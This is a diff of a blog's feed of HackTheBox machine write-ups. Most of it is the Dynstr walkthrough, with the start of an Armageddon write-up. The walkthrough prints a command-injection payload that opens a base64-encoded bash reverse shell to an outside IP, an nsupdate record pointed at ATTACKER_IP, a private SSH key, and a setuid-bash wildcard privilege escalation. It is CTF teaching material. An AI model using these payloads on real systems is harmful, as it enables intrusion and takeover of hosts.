+  s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+  s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((host, port))
+  print(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;))
+
+  subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ssh -p 2222 -L 5555:localhost:5555 kristi@target&amp;#39;&lt;/span&gt;], shell&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+  password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Kr1sT!5h@Rp3xPl0r3!&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# this isn&amp;#39;t used though&lt;/span&gt;
+  print(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;))
+  
+adb_connection(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.10.10.247&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+    <item>
+      <title>Dynstr - HackTheBox machine</title>
+      <link>/labs/dynstr/</link>
+      <pubDate>Tue, 07 Sep 2021 13:19:08 +0200</pubDate>
+      
+      <guid>/labs/dynstr/</guid>
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
+  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
+    
+      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
+    
+  &lt;/div&gt;
+  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-input&#34;
+      placeholder=&#39;Please input the password&#39;
+    /&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-button&#34;
+      type=&#34;button&#34;
+      value=&#39;Click to verify&#39;
+      onclick=&#34;_click_handler(this)&#34;
+    /&gt;
+  &lt;/div&gt;
+  &lt;div
+    class=&#34;hugo-encryptor-cipher-text&#34;
+    data-password=&#34;c2ba74897b445b0e30466fa9d7b26253&#34;
+    style=&#34;display: none;&#34;
+  &gt;
+    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
+    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- Nmap discovered ports 22, 80, 53.&lt;/p&gt;
+&lt;p&gt;80 -&amp;gt; Apache/2.4.41
+53 -&amp;gt; ISC BIND 9.16.1&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Wed Sep  1 19:36:11 2021 as: nmap -sC -sV -p- -v -oA tcp dynstr.htb
+Nmap scan report for dynstr.htb (10.10.10.244)
+Host is up (0.090s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
+|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
+|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Dyna DNS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Sep  1 19:41:49 2021 -- 1 IP address (1 host up) scanned in 337.88 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2- Web recon.
+&amp;ndash;&amp;gt; The company Dyna offers dynamic DNS services just as no-ip.com API
+&amp;ndash;&amp;gt; It has domains: dnsalias.htb, dynamicdns.htb, no-ip.htb
+&amp;ndash;&amp;gt; credentials: dynadns:sndanyd
+&amp;ndash;&amp;gt; email: &lt;a href=&#34;mailto:dns@dyna.htb&#34;&gt;dns@dyna.htb&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ll add dyna.htb to /etc/hosts.&lt;/p&gt;
+&lt;p&gt;Fuzz in the background.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dyna.htb/FUZZ -fc &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Found /nic.&lt;/p&gt;
+&lt;p&gt;3- DNS zone transfer failed.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dig axfr @dynstr.htb 
+dig axfr @dynstr.htb dnsalias.htb
+&lt;span style=&#34;color:#75715e&#34;&gt;# --&amp;gt; Transfer failed. &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Try playing with DNS with nslookup and query the 3 found domains: no answer.
+Try dig.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;dig ANY @dynstr.htb dnsalias.htb
+dnsalias.htb.           60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030300 21600 3600 604800 60                 &lt;br&gt;
+dnsalias.htb.           60      IN      NS      dns1.dyna.htb.
+dig ANY @dynstr.htb no-ip.htb
+Same answer.
+dig ANY @dynstr.htb dynamicdns.htb
+Same answer.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;mailto:hostmaster@dyna.htb&#34;&gt;hostmaster@dyna.htb&lt;/a&gt; is the DNS admin email.
+dns1.dyna.htb points to 127.0.0.1.
+This is a dead end.&lt;/p&gt;
+&lt;p&gt;4- Remember the no-ip.com API and the credentials from the web recon phase? I googled about the no-ip.com API. The first page gives an example of the update API:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&amp;amp;myip=192.0.2.25
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /nic/update?hostname=mytest.example.com&amp;amp;myip=192.0.2.25 HTTP/1.1
+Host: dynupdate.no-ip.com
+Authorization: Basic base64-encoded-auth-string
+User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Where the auth string is base64 encoded username:password.&lt;/p&gt;
+&lt;p&gt;Fuzz this API and look for command injection (sql injection is unlikely).&lt;/p&gt;
+&lt;p&gt;Use Burpsuite to do manual fuzzing first:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;GET /nic/update?hostname&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;%3bdynamicdns.no-ip.htb&amp;amp;myip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.0.2.25 HTTP/1.1 &lt;span style=&#34;color:#75715e&#34;&gt;# &amp;lt;--- Here I used dynamicdns.no-ip.htb because single domains give 911 wrong domain error, I used %3b because that&amp;#39;s &amp;#34;;&amp;#34;&lt;/span&gt;
+Authorization: Basic ZHluYWRuczpzbmRhbnlk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;returns &lt;code&gt;911 [nsupdate failed]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;5- Research nsupdate to get a feeling of how the command call is made.
+Urlencode this and send it to burpsuite repeater:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hostname=`echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE= | base64 -d | bash` anything.no-ip.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;while listening to 4242.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;whoami
+&lt;span style=&#34;color:#75715e&#34;&gt;# www-data&lt;/span&gt;
+
+cat /etc/passwd
+&lt;span style=&#34;color:#75715e&#34;&gt;# There are users bindmgr and dyna. &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;6- List /home/dyna and /home/bindmgr. There is a setuid bash with owner bindmgr, just run bash with euid:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./bash -p
+cat user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It turns out the setuid bash is a leftover of other players. Read step 7 first. The correct way is to use nsupdate to point some DNS record to our IP and then ssh with private key.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nsupdate -k infra.key
+&amp;gt; update add sftp.infra.dyna.htb &lt;span style=&#34;color:#ae81ff&#34;&gt;86400&lt;/span&gt; A ATTACKER_IP
+&amp;gt; update add REVERSED_ATTACKER_IP.in-addr.arpa &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt; PTR anything.infra.dyna.htb
+&amp;gt; send
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -i bindmgr bindmgr@dynstr.htb 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get user.txt.&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;7- Inspect /home/bindmgr and find (amidst a lot of garbage):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl -sk sftp://bindmgr@sftp.infra.dyna.htb/bindmgr-release.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;as well as the private key for bindmgr in a file whose name starts with strace. Note down the domain &lt;code&gt;sftp.infra.dyna.htb&lt;/code&gt;.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
+42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
+HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
+L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
+UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
+CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
+uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
+XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
+ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
++JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
+4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
+xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
+PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
+obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
+u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
+TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
+Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
+BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
+C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
+Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
+U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
+b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
+rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
+jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However,&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -i bindmgr bindmgr@dyna.htb 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SSH with private key still requires a password&amp;hellip; See previous step for intended path.&lt;/p&gt;
+&lt;p&gt;8- As bindmgr, &lt;code&gt;sudo -l&lt;/code&gt;. It can execute bindmgr.sh as root.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# This script generates named.conf.bindmgr to workaround the problem&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# that bind/named can only include single files but no directories.&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# It creates a named.conf.bindmgr file in /etc/bind that can be included&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# from named.conf.local (or others) and will include all files from the&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# directory /etc/bin/named.bindmgr.&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# NOTE: The script is work in progress. For now bind is not including&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#       named.conf.bindmgr. &lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# TODO: Currently the script is only adding files to the directory but&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#       not deleting them. As we generate the list of files to be included&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#       from the source directory they won&amp;#39;t be included anyway.&lt;/span&gt;
+
+BINDMGR_CONF&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/bind/named.conf.bindmgr
+BINDMGR_DIR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/bind/named.bindmgr
+
+indent&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; sed &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/^/    /&amp;#39;&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Check versioning (.version)&lt;/span&gt;
+echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Running &lt;/span&gt;$0&lt;span style=&#34;color:#e6db74&#34;&gt; to stage new configuration from &lt;/span&gt;$PWD&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; ! -f .version &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; ; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+    echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] ERROR: Check versioning. Exiting.&amp;#34;&lt;/span&gt;
+    exit &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;`cat .version 2&amp;gt;/dev/null`&amp;#34;&lt;/span&gt; -le &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;`cat &lt;/span&gt;$BINDMGR_DIR&lt;span style=&#34;color:#e6db74&#34;&gt;/.version 2&amp;gt;/dev/null`&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; ; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+    echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] ERROR: Check versioning. Exiting.&amp;#34;&lt;/span&gt;
+    exit &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Create config file that includes all files from named.bindmgr.&lt;/span&gt;
+echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Creating &lt;/span&gt;$BINDMGR_CONF&lt;span style=&#34;color:#e6db74&#34;&gt; file.&amp;#34;&lt;/span&gt;
+printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;// Automatically generated file. Do not modify manually.\n&amp;#39;&lt;/span&gt; &amp;gt; $BINDMGR_CONF
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; file in * ; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+    printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;include &amp;#34;/etc/bind/named.bindmgr/%s&amp;#34;;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$file&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; $BINDMGR_CONF
+&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Stage new version of configuration files.&lt;/span&gt;
+echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Staging files to &lt;/span&gt;$BINDMGR_DIR&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#34;&lt;/span&gt;
+cp .version * /etc/bind/named.bindmgr/
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Check generated configuration with named-checkconf.&lt;/span&gt;
+echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Checking staged configuration.&amp;#34;&lt;/span&gt;
+named-checkconf $BINDMGR_CONF &amp;gt;/dev/null
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $? -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; ; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+    echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &amp;#34;&lt;/span&gt;
+    named-checkconf $BINDMGR_CONF 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; | indent
+    exit &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; 
+    echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Configuration successfully staged.&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# *** TODO *** Uncomment restart once we are live.&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# systemctl restart bind9&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $? -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; ; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &amp;#34;&lt;/span&gt;
+	systemctl status bind9
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+	echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Restart of bind9 via systemctl succeeded.&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;9- &lt;code&gt;.version&lt;/code&gt; and a wildcard are copied to /etc/bind/named.bindmgr/. The script first checks that in the current directory there is a &lt;code&gt;.version&lt;/code&gt; file and that the number in it is greater equal than &lt;code&gt;$BINDMGR_DIR/.version&lt;/code&gt;. So we create a &lt;code&gt;.version&lt;/code&gt; file in /tmp and create a &lt;code&gt;bash&lt;/code&gt; and &lt;code&gt;--preserve=mode&lt;/code&gt; files.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cd /tmp
+cp /bin/bash .
+chmod u+s bash
+echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--preserve=mode&amp;#34;&lt;/span&gt;
+cp $BINDMGR_DIR/.version .version
+&lt;span style=&#34;color:#75715e&#34;&gt;# run the script as sudo&lt;/span&gt;
+sudo bindmgr.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;10- The files are copied to /etc/bind/named.bindmgr/. The bash setuid bit is set and it&amp;rsquo;s owned by root.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cd /etc/bind/named.bindmgr/
+bash -p
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;root.txt: c2ba74897b445b0e30466fa9d7b26253&lt;/p&gt;
+
+  &lt;/div&gt;
+&lt;/div&gt;</content>
+    </item>
+    
+    <item>
+      <title>Armageddon - HackTheBox machine</title>
       <link>/labs/armageddon/</link>
       <pubDate>Tue, 07 Sep 2021 13:18:54 +0200</pubDate>
       
       <guid>/labs/armageddon/</guid>
-      <description>Enumeration 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).
-# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.062s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.</description>
-      <content>&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+      <description>Rank: easy  Foothold 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).
+# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Jul  3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233
 Nmap scan report for 10.10.10.233
@@ -80,29 +1132,289 @@ sudo snap install --devmode leet.snap
 su dirty_sock &lt;span style=&#34;color:#75715e&#34;&gt;# password dirty_sock, it has (ALL):ALL:ALL privileges. &lt;/span&gt;
 sudo su
